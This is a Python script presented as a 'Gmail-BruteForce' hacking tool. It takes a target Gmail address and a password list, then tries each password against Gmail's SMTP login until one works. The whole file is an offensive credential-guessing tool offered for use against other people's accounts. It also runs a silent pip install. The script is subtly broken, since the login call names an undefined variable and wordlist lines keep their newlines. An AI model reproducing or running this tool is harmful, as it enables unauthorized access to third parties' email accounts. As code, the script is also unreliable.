import time as t

import os

import smtplib

try:

    import pyfiglet

except:

    os.system("pip install pyfiglet")

global green 

green = "\033[01;32;40m"

global yellow

yellow = "\033[1;33;40m"

global bold

bold = '\033[01m'

result = pyfiglet.figlet_format(" Gmail - BruteForce ")

print(bold+result)

t.sleep(4)

print(green+""" 

Tool Name: Gmail-BruteForce

Creator: AnonGreyHat Pro Cracker

Team: Dark Exploit 

""")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()

smtpserver.starttls()

email =  input(yellow+"enter the target email: "+green)

passwfile = input(green+"\nenter password file name: ")

passwfile = open (passwfile, "r").readlines()

if not email.endswith("@gmail.com"):

    print(yellow+"wrong email"+green)

    exit()

for password in passwfile:

    try:

            smtpserver.login(user, password)

            print(green+"[+] Password Found <==> %s" % password)

            break

    except smtplib.SMTPAuthenticationError:

        print(yellow+"\n [!] Password incorrect <==> %s \n" % password)
